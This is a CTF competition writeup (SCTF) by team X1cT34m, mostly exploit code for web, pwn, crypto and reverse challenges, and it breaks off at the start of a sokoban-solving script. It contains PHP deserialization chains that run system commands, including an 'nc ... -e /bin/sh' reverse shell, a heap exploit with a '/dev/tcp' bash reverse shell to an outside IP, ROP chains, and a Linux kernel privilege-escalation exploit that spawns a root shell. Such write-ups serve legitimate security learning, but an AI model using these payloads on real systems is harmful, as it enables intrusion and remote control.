# SCTF Writeup by X1cT34m

## Web


### ezosu

* `PhpSession` decode session存在逻辑问题，可以利用`|=|xxx`插入序列化数据,尾部脏数据不影响
* pop chain 任意public无参方法调用直接走`LazyOption#get` rce

```php
<?php

namespace PhpOption {
    class LazyOption {
        public $callback;
        public $arguments;
        public $option = null;
    }
}
namespace Monolog\Handler {
    class FingersCrossedHandler {
        public $passthruLevel;
        public $handler;
    }
}

namespace {
    $lazy = new PhpOption\LazyOption();
    $lazy->callback = "system"; $lazy->arguments = ["nc VPS_IP 9001 -e /bin/sh"];
    $h = new \Monolog\Handler\FingersCrossedHandler();
    $h->handler = [$lazy, "get"];
    var_dump(serialize($h));
}
```

### FUMO_on_the_Christmas_tree

按之前强网的脚本逻辑改下：剪枝的正则加些，考虑下`__call`跟`__invoke`的情况就差不多了。最后得到的path大约几十个。这时再判断下`base64_encode`后有没有`decode`的情况就能拿到最终结果。

由于class.php中`public object`的声明方式导致生成pop chain时属性不能轻易清掉。所以干脆赋值后动态调，哪里有错就改下poc。最后readfile 即可

```php
<?php 
error_reporting(1);
include "class.php";
$classes = array_slice(get_declared_classes(), 583);

$lines = file('./class.php');

function get_call_method($text) {
    preg_match('/if \(is_callable\(\[\$this->.*, \$(.*)\]\)\)/', $text, $res);
    return $res;
}

function get_invoke_from($text) {
    preg_match("/base64_decode\('(.*)'\)\;/", $text, $res);
    return base64_decode($res[1]);
}

function prune($text, $param) {
    if (preg_match('/sha1\(\$'.$param.'|md5\(\$'.$param.'|crypt\(\$'.$param.'/', $text)) {
        return true;
    }
    if (preg_match('/\$'.$param.'\s+=\s+\$(.*)/', $text, $res)) {
        if (count($res) > 1 and $res[1] != $param) {
            return true;
        }
    }
}

function can_encoded($text, $param) {
    $call_lines = explode(";", $text);
    foreach ($call_lines as $call_line) {
        if (preg_match('/\$'.$param.'\s+=\s+(.*)\(\$(.*)/', $text, $res)) {
            return $res[1];
        }
    }
}



function get_valid_call($text, $param) {
    $calls = ["call"=>[], "invoke"=>[]];
    $call_lines = explode(";", $text);
    foreach ($call_lines as $call_line) {
        $call_line = trim($call_line);
        if (preg_match("/readfile/", $call_line)) {
            return "readfile is found";
        }

        if (preg_match('/extract\(\[\$name\s+=>\s+\'(.*)\'\]\)/', $call_line, $res)) {
            // __call 的特殊情况
            return ["call"=>[$res[1]], "invoke"=>[]];
        }
        if (prune($call_line, $param)) break;
        if (preg_match('/\$this->.*->(.*?)\(\$'.$param.'\)/', $call_line, $res)) {
            // 链式调用
            array_push($calls["call"], $res[1]);
        } else if (preg_match('/call_user_func\(\$this/', $call_line, $res)) {
            // call_user_func 单参数 => __invoke
            preg_match('/\[\'(.*)\'\s+=>\s+\$'.$param.'\]/', $call_line, $res);
            array_push($calls["invoke"], $res[1]);
        }
    }
    return $calls;
}


$funcMap=[];
foreach ($classes as $class) {
    $class = new ReflectionClass($class);
    $methods = $class->getMethods();
    $classMap[$class->name] = [$methods[0]];
    $method = $methods[0];
    foreach ($method->getParameters() as $param) {
        $start = $method->getStartLine();
        $end = $method->getEndLine();
        if ($method->name === "__call") {
            $text = implode(array_slice($lines, $start, $end - $start));
            $realName = get_call_method($text)[1];
        } else if ($method->name == "__invoke") {
            $text = implode(array_slice($lines, $start, $end - $start));
            $invoke_p = get_invoke_from($text);
            $netFunc = get_valid_call($text, 'value\[\$key\]');
            $funcMap["invoke_".$invoke_p] = [$method->class, $netFunc];
        } else {
            $realName = $method->name;
        }
        $funcMap[$realName] = [$method->class, $param->name, $start, $end];
    }
}


function dfs(&$funcMap, &$func, &$lines, &$path, &$ans) {
    $param = $funcMap[$func][1];
    $start = $funcMap[$func][2];
    $end = $funcMap[$func][3];
    $funcText = implode(array_slice($lines, $start, $end - $start));
    $calls = get_valid_call($funcText, $param);
    if (is_string($calls) and $calls == "readfile is found") {
        array_push($ans, $path);
        //var_dump($func);
        return;
    } else {
        if (count($calls["call"]) == 0 and count($calls["invoke"]) == 0) return;
        if (count($calls["invoke"]) > 0) {
            foreach ($calls["invoke"] as $inv) {
                $invoke_func = $funcMap["invoke_".$inv];
                $nextcall = $invoke_func[1]["call"];
            }
        }

        if (is_array($nextcall) && count($nextcall) > 0) {
            array_merge($calls["call"], $nextcall);
        }

        foreach ($calls["call"] as $call) {
            array_push($path, $call);
            dfs($funcMap, $call, $lines, $path, $ans);
            array_pop($path);
        }
    }
}

$ans = [];
$func = "o1RgzGX";
$path = [];
dfs($funcMap, $func, $lines, $path, $ans);

$final = [];

// 从结果里继续剪，如果encode之后没有decode则丢掉
foreach ($ans as $path) {
    $change = [];
    foreach ($path as $func) {
        $param = $funcMap[$func][1];
        $start = $funcMap[$func][2];
        $end = $funcMap[$func][3];
        $funcText = implode(array_slice($lines, $start, $end - $start));
        array_push($change, can_encoded($funcText, $param));
    }
    $index = array_search("base64_encode", $change);
    if ($index and in_array("base64_decode", array_slice($change, $index, count($change) - $index)) == false) {
        continue;
    } else {
        var_dump($change);
        array_push($final, $path);
    }
}

$buffer= "";
$ch_array = str_split("abcdefghijklmnopqrstuvwxyz");
$curr = 0;
$final = $final[0];
array_unshift($final, "o1RgzGX");
foreach ($final as $func) {
    $className = $funcMap[$func][0];
    $buffer = $buffer. '$'.$ch_array[$curr++].' = new \\'.$className."();\n";
}

//var_dump($final);

$curr = 0;
$newbuffer = "";
foreach ($final as $func) {
    $className = $funcMap[$func][0];
    $class = new ReflectionClass($className);
    $props = $class->getProperties();
    foreach ($props as $prop) {
        $propName = $prop->getName();
        $nextvar = $ch_array[$curr+1];
        $newbuffer= '$'.$ch_array[$curr]."->$propName=".'$'."$nextvar;\n".$newbuffer;
    }
    $curr++;
}

$buffer =$buffer.$newbuffer;
file_put_contents("poc.php", "<?php \ninclude \"class.php\";\n".$buffer."");
```

### Loginme
用X-Real-IP绕ip，然后在admin的age处存在ssti，直接获取admin的密码就是flag
`{{.Password}}`
### Upload_it
session反序列化会触发__sleep()方法，然后找一条链子，去rce即可
__sleep()->__toString()->SerializableClosure#__invoke()
```php
<?php
namespace Symfony\Component\String{
    class LazyString{
        public $value;
        public function __construct($value){
            $this->value = $value;
        }
    }
}


namespace {
    
    require "./vendor/autoload.php";
    $func = function(){system("cat /flag");};
    $d = new \Opis\Closure\SerializableClosure($func);
    $s = new \Symfony\Component\String\LazyString($d);
    echo serialize($s);
}
```
生成的payload写成一个文件目录穿越上传到/tmp下文件名为`sess_`格式然后替换cookie去触发反序列化即可

### Upload_it 2
和1一样的，就换一个触发点直接贴exp
```php
<?php
namespace Symfony\Component\String{
    class LazyString{
        public $value;
        public function __construct($value){
            $this->value = $value;
        }
    }
}


namespace {
    class sandbox {
        private $evil;
        public function __construct(){
            $this->evil = "/flag";
        }
    }
    
    $a = [new sandbox,"backdoor"];
    $s = new \Symfony\Component\String\LazyString($a);
    echo urlencode(serialize($s));
}
```


## Pwn
### bash
```python
from pwn import*
import base64
import os
def store(index):
	return '\x00' + chr(index)
def loadNum(index):
	return '\x01' + chr(index) # push Num
def loadStr(index):
	return '\x02' + chr(index) # push Str PTR
def loadWord(index):
	return '\x03' + chr(index)
def call(funcIndex):
	return '\x04' + chr(funcIndex)
def add(indexA,indexB):
	return '\x07' + chr(indexA) + chr(indexB)
def exec_cmd(command):
	os.system(command)

libc = ELF('./libc-2.34.so',checksec=False)
Number = ''
Number += p32((0x21A560 + 0x38  - libc.sym['sleep'])&0xFFFFFFFF)
Number += p32((libc.sym['sleep']  - libc.sym['system'])&0xFFFFFFFF)
Number += p32(0x40)
Number += p32(0x220)
Number += p32((libc.sym['_IO_2_1_stdout_']  - libc.sym['sleep']) & 0xFFFFFFFF)
Number += p32(0)
code  = ''
code += loadWord(3)
code += loadNum(1)
code += '\x08'

code += loadWord(3)
code += loadNum(0)
code += '\x07'

code += loadStr(0)
code += loadNum(3)
code += '\x07'

code += loadNum(2)
code += call(4)

code += loadWord(3)
code += loadNum(4)
code += '\x07'

code += loadStr(0)

code += loadNum(2)
code += call(4)

code += loadStr(1)
code += loadNum(5)
code += loadNum(5)
code += call(0)


VM  = 'SCOM_LZ\x00'
VM += p32(len(code))			# Code Length
VM += code        				# Code Data
VM += p32(len(Number)/4)   		# Num Length
VM += Number 					# Number
VM += p32(0x2) 					# String Count
VM += p32(0x5) 					# Word Count
VM += p32(len('1;/home/ctf/getflag >&2')) + '1;/home/ctf/getflag >&2'
VM += p32(len('/FMYY')) + '/FMYY'
VM += p32(6) + 'Dancer' #0
VM += p32(6) + 'Dasher' #1
VM += p32(7) + 'Rudolph'#2
VM += p32(5) + 'sleep'  #3
VM += p32(5) + 'Vixen'  #4

exec_cmd('rm /tmp/fmyy.scom')
exec_cmd('touch /tmp/fmyy.scom')
with open ("/tmp/fmyy.scom","wb") as f:
	f.write(VM)

```

### song
```python
from pwn import*
import os
def exec_cmd(command):
	os.system(command)
def Create(name,value,sign = 0):
	payload  = 'gift'
	payload += ' '
	payload += name
	payload += ' '
	payload += 'is'
	payload += ' '
	if sign == 1:
		payload += '\"'
		payload += str(value)
		payload += '\";' + '\n'
	else:
		payload += str(value) + ';' + '\n'
	return payload
def call(funcName,arg1,arg2,arg3,retVar = None):
	payload  = 'reindeer'
	payload += ' '
	payload += funcName
	payload += ' '
	payload += 'delivering'
	payload += ' '
	payload += 'gift'
	payload += ' '
	payload += str(arg1) + ' ' + str(arg2) + ' ' + str(arg3)
	if retVar == None:
		payload += ';' + '\n'
	else:		
		payload += ' '
		payload += 'brings back gift'
		payload += ' '
		payload += retVar
		payload += ';' + '\n'
	return payload

def pwn(p,Length,BF_FLAG):
	payload  = Create('filePath','/home/ctf/flag',1)
	payload += Create('flagMEM','N'*0x40,1)
	payload += Create('FakeFlag',BF_FLAG,1)
	payload += Create('inFD','4')
	payload += Create('retVal','0')
	payload += Create('Length','64')
	payload += Create('OpenFLAG','0')
	payload += Create('cmpRet','0')
	payload += Create('cmpLength',str(Length))
	payload += call('Dancer','filePath','OpenFLAG','OpenFLAG')
	payload += call('Dasher','inFD','flagMEM','Length')
	payload += call('Dancer','flagMEM','OpenFLAG','OpenFLAG')	
	p.sendlineafter('(EOF to finish):',payload)
	p.sendline('EOF')

p = remote('124.71.144.133', 2144)
pwn(p,1,'S')
p.interactive()

```

### wishes
```python
import requests
from pwn import*
url = 'http://124.70.201.145:7777/'
libc = ELF('./libc-2.31.so')
json = '''
{
	"/proc/self/maps":"FMYY"
}
'''
data = {'wishes':json}
p = requests.post(url,data)

retData = p.text
Offset = retData.index('                    /lib/x86_64-linux-gnu/libc-2.31.so')
libc_base = int(retData[Offset - 41 -12:Offset - 41],16)
log.info('LIBC:\t' + hex(libc_base))


free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']
json = '''
{{
  "bash -c 'bash -i >& /dev/tcp/106.52.232.95/4657 0>&1'":"bash -c 'bash -i >& /dev/tcp/106.52.232.95/4657 0>&1'",
  "HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH":"HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH",
  "UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU":"UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU",
  "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF":"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF",
  "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF":"FreeOldFMYY",
  "UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU":"Freeoldfmyy",
  "Target":"PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP\\\"LLLLLLLLLLLLLL{0}",
  "HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH":"freeoldHHHH",
  "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC":"CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC\\\"{1}",
  "bash -c 'bash -i >& /dev/tcp/106.52.232.95/4657 0>&1'":"freeOldReadFlag"
}}'''.format(p64(free_hook - 0x60)[0:6],p64(system)[0:6])


data = {'wishes':json}
p = requests.post(url,data)
print p.text
```

### gadget
```python
from pwn import*
elf = ELF('./main')
pop_rax_ret = 0x0000000000401001
pop_rdi_jmp_rax = 0x0000000000402BE4
retf = 0x0000000000409BF6
syscall = 0x0000000000408865
pop_rsp_ret = 0x0000000000409D1C
int80_ret = 0x00000000004011f3
pop_rsi_ret = 0x0000000000401732
pop_rbx_ret = 0x0000000000403072
pop_rcx_ret = 0x000000000040117b
pop_rbp_ret = 0x0000000000401102
def pwn(p,index,ch):
	payload  = '\x00'*0x38
	payload += p64(pop_rax_ret) + p64(elf.sym['read_sys'])
	payload += p64(pop_rdi_jmp_rax) + p64(elf.bss() + 0x800)
	payload += p64(pop_rax_ret) + p64(elf.sym['read_sys'])
	payload += p64(pop_rdi_jmp_rax) + p64(elf.bss() + 0x8C0)
	payload += p64(pop_rsp_ret) + p64(elf.bss() + 0x800)

	p.send(payload.ljust(0xC0,'\x00'))

	payload2  = p64(retf) + p32(pop_rbx_ret) + p32(0x23)
	payload2 += p32(elf.bss() + 0x800 + 0xC0*2 - 6) + '\x00'*0xC
	payload2 += p32(pop_rcx_ret) + p32(0)
	payload2 += p32(pop_rax_ret) + p32(5)
	payload2 += p32(int80_ret)
	payload2 += p32(retf) + p32(pop_rax_ret) + p32(0x33)
	payload2 += p64(pop_rax_ret)
	payload2 += p64(pop_rsi_ret) + p64(elf.bss() + 0xC00) + '\x00'*0x10
	payload2 += p64(pop_rdi_jmp_rax) + p64(3)
	payload2 += p64(0)
	payload2 += p64(syscall)

	bytecmp = 0x0000000000408266
	loop = 0x408E1F

	payload2 += p64(pop_rax_ret)
	payload2 += p64(elf.bss() + 0xC00 + 0x46 + index)
	payload2 += p64(pop_rcx_ret) + p64(ch)
	payload2 += p64(pop_rbp_ret) + p64(loop)
	payload2 += p64(bytecmp)

	payload2  = payload2.ljust(0xC0*2 - 6,'\x00') + './flag'
	p.send(payload2)

index = 0
ans = []
while True:
	for ch in range(0x20, 0x7F):
		p = remote('121.37.135.138', 2102)
#		p = process('./main')
		pwn(p, index, ch)
		start = time.time()
		try:
			p.recvuntil('FMYY',timeout=2.0)
		except:
			pass
		end = time.time()
		p.close()
		if end-start < 0.5:
			ans.append(ch)
			print("".join([chr(i) for i in ans]))
			break
	else:
		print("".join([chr(i) for i in ans]))
		break
	index = index + 1

# SCTF{woww0w_y0u_1s_g4dget_m45ter}
print("".join([chr(i) for i in ans]))
p.interactive()
```

### dataleak
```python
from pwn import*

context.log_level = 'DEBUG'
p = process('./main')
p = remote('124.70.202.226',2101)
p.send('FMS/*' + '\x01'*0x9)

p.send('FM/*' + '\x01'*0xA)

dataA = p.recv(0xB)
p.send('FMYYSSSS/*' + '\x01'*(0xC - 8))

p.send('FMYYSSSS/*' + '\x01'*(0xC - 8))


dataB = p.recv(0xB)

p.sendafter('data',dataB + dataA)
p.interactive()
```

### kernel
```C
//gcc exp.c -o exp --static -masm=intel -lpthread
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdint.h>
#include <sched.h>
#include <errno.h>
#include <pty.h>
#include <linux/types.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/sem.h>
#include <signal.h>
#define KERNCALL __attribute__((regparm(3)))
#define _GNU_SOURCE

int raceSign = 0,fd;
size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
	__asm__("mov user_cs, cs;"
			"mov user_ss, ss;"
			"mov user_sp, rsp;"
			"pushf;"
			"pop user_rflags;"
			);
	puts("[*]Status Has Been Saved.");
}

void get_shell()
{
	raceSign = 1;
	write(1,"[+] Got R00t (:\n",strlen("[+] Got R00t (:\n"));
    system("/bin/sh");
    exit(0);
}


void add_note() {
	ioctl(fd,0x5555,0x80);
}

void del_note() {
	ioctl(fd,0x6666,NULL);
}

void show_note() {
	ioctl(fd,0x7777,NULL);
}

void *pthread_func(void *mem) {
	usleep(300);
	while(!raceSign) {
		write(fd,(void*)mem,0x20);
	}
}


size_t REG12,kernel_base,commit_creds,prepare_kernel_cred;
size_t XCHG_EAX_ESP,pop_rdi_ret,push_rax_pop_rdi_ret,swapgs_ret,iretq;

int main()
{
	signal(SIGSEGV, get_shell);
	signal(SIGTRAP, get_shell);
	save_status();
	fd = open("/dev/seven", O_RDWR); if(fd < 0)	 _exit(-1);

	char buffer[0x80];
	strcpy(buffer,"%L");
	add_note();
	write(fd,buffer,0x80);
	show_note();
	printf("Input the Value OF REG12:  ");
//	scanf("%llx",&REG12);
	REG12 = 0xffffffff82b15f40;
	////////////////////////////////////////////////////////
	kernel_base = REG12 - 0x1B15F40;
	commit_creds = kernel_base + 0x8C360;
	prepare_kernel_cred = kernel_base + 0x8C780;
	XCHG_EAX_ESP = kernel_base + 0x11CB0;
	pop_rdi_ret = kernel_base + 0x16E9;
	push_rax_pop_rdi_ret = kernel_base + 0x65AFAC;
	swapgs_ret = kernel_base + 0xC00F58;
	iretq = kernel_base + 0x24F92;
	uint32_t *ROP_Stack = (uint32_t*)(XCHG_EAX_ESP & 0xFFFFFFFF);
	if(mmap((void*)(XCHG_EAX_ESP & 0xFFFFF000), 0x2000, 7, 0x22, -1, 0) == MAP_FAILED) _exit(-1);
	
	size_t ROP[] = 
	{
		pop_rdi_ret,
		0,
		prepare_kernel_cred,
		push_rax_pop_rdi_ret,
		commit_creds,
		swapgs_ret,		// swapgs; pop rbp; ret;
		iretq,		// iretq; ret;
		(size_t)get_shell,
		user_cs,               	// saved CS
		user_rflags,            // saved EFLAGS
		user_sp,
		user_ss
	};
	memcpy((void*)ROP_Stack ,(void*)ROP,0x80);
	///////////////////////////////////////////////////////
	pthread_t thread;
	char *mem = (char *)calloc(1,0x1000);
	*(size_t*)(mem + 0x00) = XCHG_EAX_ESP;

	if ((pthread_create(&thread, NULL, pthread_func, (void*)mem)) == -1) {
		perror("Thread Error");
		return 1;
	}
	add_note();
	del_note();
	while(!raceSign) {
		usleep(1);
		socket(22, AF_INET, 0); 
	}
	if(pthread_join(thread,NULL)) {
		perror("Thread Finish");
		_exit(-1);
	}
	return 0;
	
}
```

## Crypto
### ciruit map

```cpp
#include<iostream>
#include<unordered_map>
#include<vector>
using namespace std;

unsigned int SBoxes[6][16] = {{15, 1, 7, 0, 9, 6, 2, 14, 11, 8, 5, 3, 12, 13, 4, 10}, {3, 7, 8, 9, 11, 0, 15, 13, 4, 1, 10, 2, 14, 6, 12, 5}, {4, 12, 9, 8, 5, 13, 11, 7, 6, 3, 10, 14, 15, 1, 2, 0}, {2, 4, 10, 5, 7, 13, 1, 15, 0, 11, 3, 12, 14, 9, 8, 6}, {3, 8, 0, 2, 13, 14, 5, 11, 9, 1, 7, 12, 4, 6, 10, 15}, {14, 12, 7, 0, 11, 4, 13, 15, 10, 3, 8, 9, 2, 6, 1, 5}};
unsigned int SInvBoxes[6][16] = {{3, 1, 6, 11, 14, 10, 5, 2, 9, 4, 15, 8, 12, 13, 7, 0}, {5, 9, 11, 0, 8, 15, 13, 1, 2, 3, 10, 4, 14, 7, 12, 6}, {15, 13, 14, 9, 0, 4, 8, 7, 3, 2, 10, 6, 1, 5, 11, 12}, {8, 6, 0, 10, 1, 3, 15, 4, 14, 13, 2, 9, 11, 5, 12, 7}, {2, 9, 3, 0, 12, 6, 13, 10, 1, 8, 14, 7, 11, 4, 5, 15}, {3, 14, 12, 9, 5, 15, 13, 2, 10, 11, 8, 4, 1, 6, 0, 7}};
unsigned int PBox[] = {15, 22, 11, 20, 16, 8, 2, 3, 14, 19, 18, 1, 12, 4, 9, 13, 23, 21, 10, 17, 0, 5, 6, 7};
unsigned int PInvBox[] = {20, 11, 6, 7, 13, 21, 22, 23, 5, 14, 18, 2, 12, 15, 8, 0, 4, 19, 10, 9, 3, 17, 1, 16};

unordered_map<unsigned int, unsigned int>  middle_data;

unsigned int S(unsigned int block, unsigned int SBoxes[6][16]){
    unsigned int output = 0;
    for(int i = 0; i < 6; i++){
        output |= SBoxes[i][(block >> 4 * i) & 0b1111] << 4 * i;
    }
    return output;
}
    
unsigned int permute(unsigned int block, unsigned int pbox[]){
    unsigned int output = 0;
    unsigned int bit = 0;
    for(int i = 0; i < 24; i++){
        bit = (block >> pbox[i]) & 1;
        output |= (bit << i);
    }
    return output;
}

unsigned int encrypt_data(unsigned int block, unsigned int key){
    unsigned int res = block;
    for(int i = 0; i < 3; i++){
        res ^= key;
        res = S(res, SBoxes);
        res = permute(res,PBox);
    }
    res ^= key;
    return res;
}

unsigned int decrypt_data(unsigned int block, unsigned int key){
    unsigned int res = block;
    res ^= key;
    for(int i = 0; i < 3; i++){
        res = permute(res, PInvBox);
        res = S(res, SInvBoxes);
        res ^= key;
    }
    return res;
}

unsigned int encrypt(unsigned int block, unsigned int key1, unsigned int key2){
    unsigned int res = block;
    res = encrypt_data(res, key1);
    res = encrypt_data(res, key2);
    return res;
}

unsigned int decrypt(unsigned int block, unsigned int key1, unsigned int key2){
    unsigned int res = block;
    res = decrypt_data(res, key2);
    res = decrypt_data(res, key1);
    return res;
}

void init_middle_data(){
    cout << "Init middle data" << endl;
    unsigned int enc = 0;
    for(unsigned int i = 0; i < 0x1000000; i++){
        enc = encrypt_data(0,i);
        if(middle_data.find(enc) == middle_data.end()){
            middle_data.insert(pair<unsigned int, unsigned int>(enc,i));
        }
        else{
            unsigned int count = 0;
            unsigned int tmp = 0;
            do{
                count++;
                tmp = count << 24 | enc;
            }while(middle_data.find(tmp) != middle_data.end());
            middle_data.insert(pair<unsigned int, unsigned int>(tmp,i));
        }
    }
}

unordered_map<unsigned int, unsigned int> find_possible_key(unsigned int t){
    cout << "Find possible keys for " << t << endl;
    unordered_map<unsigned int, unsigned int> result;
    unsigned int dec = 0;
    for(unsigned int i = 0; i < 0x1000000; i++){
        unsigned int dec_count = 0;
        dec = decrypt_data(t,i);
        unsigned int dec_tmp = dec;
        while(middle_data.find(dec) != middle_data.end()){
            unsigned int key = i;
            if(result.find(key) == result.end()){
                result.insert(pair<unsigned int, unsigned int>(key,middle_data[dec]));
            }
            else{
                unsigned int count = 0;
                unsigned int tmp;
                do{
                    count++;
                    tmp = count << 24 | key;
                }while(result.find(tmp) != result.end());
                result.insert(pair<unsigned int, unsigned int>(tmp,middle_data[dec]));
            }
            dec_count++;
            dec = dec_count << 24 | dec_tmp;
        }
    }
    return result;
}

unsigned int recover_key_part2(vector< unordered_map<unsigned int, unsigned int> > possible_keys,vector<unsigned int>enc_labels,unsigned int a0,unsigned int b0,int idxi,int idxj){
    unordered_map<unsigned int, unsigned int> choice_keys;
    unsigned int c, c1, b1, a00;
    for(int i = 0; i < 4; i++){
        if(i == idxi || i == idxj) continue;
        choice_keys = possible_keys[i];
        c = enc_labels[i];
        c1 = enc_labels[idxi];
        for(auto iter = choice_keys.begin(); iter != choice_keys.end(); ++iter){
            b1 = iter->first;
            if(b1 > 0x1000000) continue;
            unsigned int dec_b1 = b1;
            unsigned int count = 0;
            while(choice_keys.find(b1) != choice_keys.end()){
                a00 = choice_keys[b1];
                if(a0 == a00 && decrypt(c,a0,dec_b1) == decrypt(c1,a0,b0)){
                    return dec_b1;
                }
                count++;
                b1 = count << 24 | dec_b1;
            }
        }
    }
    return 0;
}

bool recover_key(vector< unordered_map<unsigned int, unsigned int> > possible_keys,vector<unsigned int>enc_labels){
    unordered_map<unsigned int, unsigned int>  choice_keys, choice_keys2;
    unsigned int c1, b0, a0, p1, c2, a1, b1;
    for(int i = 0; i < 4; i++){
        cout << "Recover key " << i << endl;
        choice_keys = possible_keys[i];
        c1 = enc_labels[i];
        for(int j = 0; j < 4; j++){
            if(i == j) continue;
            choice_keys2 = possible_keys[j];
            c2 = enc_labels[j];
            for(auto iter = choice_keys.begin(); iter != choice_keys.end(); ++iter){
                b0 = iter->first;
                if(b0 >= 0x1000000) continue;
                unsigned int count = 0;
                unsigned int dec_b0 = b0;
                while(choice_keys.find(b0) != choice_keys.end()){
                    a0 = choice_keys[b0];
                    p1 = decrypt(c1, a0, dec_b0);
                    unsigned int b0_tmp = dec_b0;
                    unsigned int count_tmp = 0;
                    while(choice_keys2.find(b0_tmp) != choice_keys2.end()){
                        a1 = choice_keys2[b0_tmp];
                        if(p1 == decrypt(c2,a1,dec_b0)){
                            b1 = recover_key_part2(possible_keys,enc_labels,a0,dec_b0,i,j);
                            if(b1 != 0){
                                cout << "Find keys : " << a1 << ", " << a0 << endl;
								cout << "Find keys : " << b1 << ", " << b0 << endl;
                                return true;
                            }
                        }
                        count_tmp++;
                        b0_tmp = count_tmp << 24 | dec_b0;
                    }
                    count++;
                    b0 = count << 24 | dec_b0;
                }
            }
        }
    }
    return false;
}


unsigned int g_tables[2][4][2] = {{{13303835L, 2123830L},{2801785L, 11303723L},{13499998L, 248615L},{13892520L, 7462011L}},{{3244202L, 918053L},{3277177L, 6281266L},{1016382L, 7097624L},{10016472L, 13600867L}}};

int main(){
    init_middle_data();
    for(int i = 0; i < 2; i++){
        vector< unordered_map<unsigned int, unsigned int> > possible_keys(4);
        vector<unsigned int>enc_labels(4);
        for(int j = 0; j < 4; j++){
            possible_keys[j] = find_possible_key(g_tables[i][j][1]);
            enc_labels[j] = g_tables[i][j][0];
        }
        recover_key(possible_keys,enc_labels);
    }

}
```
```python
import hashlib
from Crypto.Util.number import long_to_bytes
from block_cipher import decrypt


def xor(A, B):
    return bytes(a ^ b for a, b in zip(A, B))


def re_and(g_table, labels0, labels1):
    key = [0, 0]

    for g in g_table:
        if decrypt(g[1], labels0[0], labels1[0]) == 0:
            key[0] = decrypt(g[0], labels0[0], labels1[0])

        if decrypt(g[1], labels0[0], labels1[1]) == 0:
            key[1] = decrypt(g[0], labels0[0], labels1[1])

        if decrypt(g[1], labels0[1], labels1[0]) == 0:
            key[1] = decrypt(g[0], labels0[1], labels1[0])

        if decrypt(g[1], labels0[1], labels1[1]) == 0:
            key[1] = decrypt(g[0], labels0[1], labels1[1])

    return key


def re_xor(g_table, labels0, labels1):
    key = [0, 0]

    for g in g_table:
        if decrypt(g[1], labels0[0], labels1[0]) == 0:
            key[1] = decrypt(g[0], labels0[0], labels1[0])

        if decrypt(g[1], labels0[0], labels1[1]) == 0:
            key[0] = decrypt(g[0], labels0[0], labels1[1])

        if decrypt(g[1], labels0[1], labels1[0]) == 0:
            key[0] = decrypt(g[0], labels0[1], labels1[0])

        if decrypt(g[1], labels0[1], labels1[1]) == 0:
            key[1] = decrypt(g[0], labels0[1], labels1[1])

    return key


keys = [
    [13675268, 8343801],
    [12870274, 10251687],
    [12490757, 6827786],
    [3391233, 2096572],
    [],
    [],
    [],
    []
]

G_Table = {5: [(13303835, 2123830),
               (2801785, 11303723),
               (13499998, 248615),
               (13892520, 7462011)],
           6: [(3244202, 918053),
               (3277177, 6281266),
               (1016382, 7097624),
               (10016472, 13600867)],
           7: [(5944875, 3442862),
               (7358369, 8423543),
               (6495696, 9927178),
               (13271900, 11855272)],
           9: [(5333988, 87113),
               (9375869, 11687470),
               (5011062, 14981756),
               (2509493, 12330305)]}

keys[4] = re_and(G_Table[5], keys[0], keys[1])
keys[5] = re_and(G_Table[6], keys[2], keys[3])
keys[6] = re_and(G_Table[7], keys[4], keys[5])
keys[7] = re_xor(G_Table[9], keys[6], keys[3])
the_chaos = b''
for i in keys:
    tmp = sum(i)
    the_chaos += bytes(long_to_bytes(tmp))
mask = hashlib.md5(the_chaos).digest()
c = long_to_bytes(0x1661fe85c7b01b3db1d432ad3c5ac83a)
print(xor(mask, c))
```
## Reverse

### SycGame

逆向出来就是一个推箱子游戏，地图随机生成，每次进行游戏时间有限，只能考虑脚本实现自动化推箱子了。不会A*算法，就糊了几个BFS加上一些限制条件，试了试再生成地图为某些特定条件下时可以找到通关游戏的路径，然后就是写了一个 shell 脚本不断的 调用 exp.py 将输出结果全部重定向到一个文件中，直接在文件中搜索有没有 flag 就行

下面这个文件为 exp.py 通过 pwntools 链接到远程，如果 成功进行了 5 次游戏就会 输出 200 个 `&` 所以直接在输出文件中搜索 `&` 标识即知道是否达到输出 flag 条件，context.log_level 为 `debug` 所有发送或接收都会打印出来，直接就可以看见 flag
```Python
from pwn import *
import copy
import os
import time

class addr:
    def __init__(self, x, y):
        self.x = x
        self.y = y

boxs = []
storage = []
